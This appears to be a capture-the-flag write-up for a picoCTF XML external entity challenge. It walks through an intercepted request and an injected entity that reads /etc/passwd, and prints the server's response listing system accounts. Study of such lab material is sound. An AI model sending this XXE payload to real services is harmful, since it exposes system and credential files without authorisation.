#### Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Hints ##

XML external entity Injection

## Process ##


First you need to intercept the petition with a proxy and watch how works the button "details"

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:62455
Content-Length: 61
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:62455
Referer: http://saturn.picoctf.net:62455/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<data><ID>1</ID></data>
```

And here is the response

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 30 Sep 2023 23:07:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 95
Connection: close

<strong>Special Info::::</strong> University in Kigali, Rwanda offereing MSECE, MSIT and MS EAI
```



Intercept the petition and add an entity , you can find more about entities on XXE but bassically 
What is an entity in XML?

XML entities are **a way of representing an item of data within an XML document, instead of using the data itself**. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and > .

```
POST /data HTTP/1.1
Host: saturn.picoctf.net:62455
Content-Length: 137
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:62455
Referer: http://saturn.picoctf.net:62455/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
<data><ID>&xxe;</ID></data>
```


And here we see the content 

```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Sat, 30 Sep 2023 22:48:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1023
Connection: close

Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{*********************}
```